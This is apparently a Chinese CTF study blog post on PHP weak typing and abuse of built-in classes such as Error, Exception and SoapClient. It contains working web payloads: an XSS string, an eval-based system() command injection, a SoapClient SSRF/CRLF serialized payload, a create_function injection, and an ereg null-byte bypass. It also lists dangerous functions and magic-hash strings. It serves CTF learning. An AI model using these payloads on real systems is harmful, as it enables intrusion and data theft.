---
title: PHP 特性与原生类利用
date: 2026-11-22 08:06:00
author: Xendr1a
categories: [Web安全, Web基础]
tags: [PHP, 原生类, CTF]
description: PHP 弱类型、内置类（Error/Exception/SoapClient）、危险函数与常考特性。
toc: true
---

汇总 CTF 里高频的 PHP 特性：弱类型比较、原生类（Error/Exception/SoapClient）、危险函数与绕过。

## 原生类

php中内置很多原生的类，在CTF中常以`echo new $`$a($`$b)`这种形式出现，当看到这种关键字眼时，就要考虑本题是不是需要原生类利用了。

主要讲讲常用的吧

```text
Error
Exception
SoapClient
DirectoryIterator
FilesystemIterator
SplFileObject
SimpleXMLElement
```

看看总的

```text
<?php
$classes = get_declared_classes();
foreach ($classes as $class) {
    $methods = get_class_methods($class);
    foreach ($methods as $method) {
        if (in_array($method, array(
            '__destruct',
            '__toString',
            '__wakeup',
            '__call',
            '__callStatic',
            '__get',
            '__set',
            '__isset',
            '__unset',
            '__invoke',
            '__set_state'
        ))) {
            print $class . '::' . $method . "\n";
        }
    }
}

/*
Exception::__wakeup
Exception::__toString
ErrorException::__wakeup
ErrorException::__toString
Error::__wakeup
Error::__toString
CompileError::__wakeup
CompileError::__toString
ParseError::__wakeup
ParseError::__toString
TypeError::__wakeup
TypeError::__toString
ArgumentCountError::__wakeup
ArgumentCountError::__toString
ArithmeticError::__wakeup
ArithmeticError::__toString
DivisionByZeroError::__wakeup
DivisionByZeroError::__toString
Generator::__wakeup
ClosedGeneratorException::__wakeup
ClosedGeneratorException::__toString
DateTime::__wakeup
DateTime::__set_state
DateTimeImmutable::__wakeup
DateTimeImmutable::__set_state
DateTimeZone::__wakeup
DateTimeZone::__set_state
DateInterval::__wakeup
DateInterval::__set_state
DatePeriod::__wakeup
DatePeriod::__set_state
JsonException::__wakeup
JsonException::__toString
LogicException::__wakeup
LogicException::__toString
BadFunctionCallException::__wakeup
BadFunctionCallException::__toString
BadMethodCallException::__wakeup
BadMethodCallException::__toString
DomainException::__wakeup
DomainException::__toString
InvalidArgumentException::__wakeup
InvalidArgumentException::__toString
LengthException::__wakeup
LengthException::__toString
OutOfRangeException::__wakeup
OutOfRangeException::__toString
RuntimeException::__wakeup
RuntimeException::__toString
OutOfBoundsException::__wakeup
OutOfBoundsException::__toString
OverflowException::__wakeup
OverflowException::__toString
RangeException::__wakeup
RangeException::__toString
UnderflowException::__wakeup
UnderflowException::__toString
UnexpectedValueException::__wakeup
UnexpectedValueException::__toString
CachingIterator::__toString
RecursiveCachingIterator::__toString
SplFileInfo::__toString
DirectoryIterator::__toString
FilesystemIterator::__toString
RecursiveDirectoryIterator::__toString
GlobIterator::__toString
SplFileObject::__toString
SplTempFileObject::__toString
```

## Error／Exception

### 报错类(适用于php7开启报错的情况下

Error类是php的一个内置类，用于自动自定义一个Error，因为它内置有一个`__toString()`的方法，被当作字符串输出时，会导致各类风险。

#### Exception类结构(Error结构与其类似）

```text
class Exception implements Throwable
{
    protected $message = '';
    protected $code = 0;
    protected $file;
    protected $line;
    
    public function __construct($message = "", $code = 0, Throwable $previous = null)
    public function getMessage()
    public function getCode()
    public function getFile()
    public function getLine()
    public function getTrace()
    public function getTraceAsString()
    public function __toString()
    public function __clone()
}
```

##### Error和Exception类都实现了`__toString`方法，当对象被当作字符串处理时会自动调用：

```text
public function __toString() {
    return $this->getMessage();
}
```

#### XSS

```text
<?php
$a = new Error("<script>alert('xss')</script>");
$b = serialize($a);
echo unserialize($b);  //会弹窗
```

#### 命令执行

```text
<?php
$a = $_GET['a'];
$b = $_GET['b'];
eval("echo new $a($b);");

// ?a=Error&b=system('ifconfig')
```

#### 绕过md5等哈希比较

```text
<?php
$a = new Error("payload",1);$b = new Error("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;

/*echo
Error: payload in C:\Users\w的飞行日记\Desktop\by Xendria\原生类\Error\信息泄露利用.php:2
Stack trace:
#0 {main}

Error: payload in C:\Users\w的飞行日记\Desktop\by Xendria\原生类\Error\信息泄露利用.php:2
Stack trace:
#0 {main}
```

## SoapClient

SoapClient 是 PHP 的一个内置类，通常用来连接和调用 Web Service 接口。这个类在 CTF 题目和一些特定场景下，可被巧妙利用来发起 **SSRF（服务端请求伪造）** 甚至结合 **CRLF（回车换行）注入** 攻击。

### 官方

```text
class SoapClient {
    /* Methods */
    public __construct(?string $wsdl, array $options = [])
    public __call(string $name, array $args): mixed
    public __doRequest(
        string $request,
        string $location,
        string $action,
        int $version,
        bool $oneWay = false
    ): ?string
    public __getCookies(): array
    public __getFunctions(): ?array
    public __getLastRequest(): ?string
    public __getLastRequestHeaders(): ?string
    public __getLastResponse(): ?string
    public __getLastResponseHeaders(): ?string
    public __getTypes(): ?array
    public __setCookie(string $name, ?string $value = null): void
    public __setLocation(?string $location = null): ?string
    public __setSoapHeaders(SoapHeader|array|null $headers = null): bool
    public __soapCall(
        string $name,
        array $args,
        ?array $options = null,
        SoapHeader|array|null $inputHeaders = null,
        array &$outputHeaders = null
    ): mixed
}
```

#### 正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法

```text
怪怪的直接看列题  ctfshow的web259
flag.php

$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);

if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}

<?php

highlight_file(__FILE__);

$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();
```

从代码中可以看出，要拿到flag，我们需要让服务器自己访问`flag.php`，并且在请求中满足两个条件：

1. **IP检查**：`X-Forwarded-For`头的倒数第二个IP是`127.0.0.1`。
2. **Token验证**：POST请求体中包含`token=ctfshow`。

```text
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "ssrf"));
$a = serialize($b);
$a = str_replace('^^',"\r\n",$a);
echo urlencode($a);
?>
```

## create_function()函数利用

适用范围 ： php < 7.2 7.2

类似于这样的利用，就是断句？

```text
<?php
function lambda_1() {
}system('cat /flag');
/*}
```

## erge()

关于erge()的漏洞，`ereg` 遇到 NULL字节会截断检查

```text
#ctfshow web108
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}

?>
```

一个关于erge()的漏洞，`ereg` 遇到 NULL字节会截断检查，其中 `%00` 是URL编码的NULL字节，所以被检测的就只有前面的`%00`部分，strrev() 函数会反转字符串，`0x36d`=877，那我们就可以构造payload：`?c=a%00778`

## in_array()函数

in_array()函数的弱比较漏洞，如果没有设置第三个参数，in_array() 函数在比较时默认是弱类型比较，这意味着它会进行自动类型转换。例如数组中的元素是整数，而搜索的值是字符串，PHP 会尝试将字符串转换为整数来进行比较。就比如说传入1.php,它就会认为只传入了1

列题看ctfshow web99

还有在php中可以用\绕过    php中解析为全局函数

列题[网鼎杯 2020 朱雀组]phpweb

## 部分偶遇的用过的函数

row

PHP

highlight_file()==show_source()用于显示一个给定文件的源代码

highligt_string()    对字符串进行语法高亮显示

scandir()    用于读取指定目录中的文件和子目录名称，并将它们作为一个数组返回

glob()          是一种在文件系统中进行模式匹配的工具，主要用于查找符合特定模式的文件和目录。它支持使用通配符（如 *、? 和 []）来匹配文件路径，并将匹配的结果以数组形式返回

sort()   用于对数组单元从低到高进行排序。

## 一些知识

**PHP代码相关**

eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()、create_function()、array_map()，preg_str()

**系统命令执行相关**

system()、passthru()、exec()、pcntl_exec()、shell_exec()、popen()、proc_open()、反引号（``）、ob_start()

直接显示文件内容函数：show_source()、highlight_file()、var_dump()

[读取文件内容函数](https://www.shuzhiduo.com/A/QV5Z6g7V5y/)：file_get_contents()、file()、readfile()、fopen()、php_strip_whitespace()

无法直接读取文件函数：fpassthru()、fread()

打印输出函数：echo()、print()、print_r()、printf()、sprint()、var_dump()、var_export()

执行外部命令函数：system()、passthru()、popen()、proc_open()、exec()、shell_exec()、内敛执行（反引号``、\${}）

row

linux部分知识

\| 直接执行后面的语句  
|| 如果前面执行的语句出错，那么才执行后面的语句  
& 前面和后面的语句都会被执行  
&& 前面语句出错后面的语句也不执行，只有前面的语句成功执行才执行后面的语句  
; 前面的语句执行完成后，继续执行后面的语句。(特有)

md5：

```text
240610708:0e462097431906509019562988736854
QLTHNDT:0e405967825401955372549139051580
QNKCDZO:0e830400451993494058024219903391
PJNPDWY:0e291529052894702774557631701704
NWWKITQ:0e763082070976038347657360817689
NOOPCJF:0e818888003657176127862245791911
MMHUWUV:0e701732711630150438129209816536
MAUXXQC:0e478478466848439040434801845361
```

sha1：

```text
10932435112: 0e07766915004133176347055865026311692244
aaroZmOk: 0e66507019969427134894567494305185566735
aaK1STfY: 0e76658526655756207688271159624026011393
aaO8zKZF: 0e89257456677279068558073954252716165668
aa3OFF9m: 0e36977786278517984959260394024281014729
0e1290633704: 0e19985187802402577070739524195726831799
```
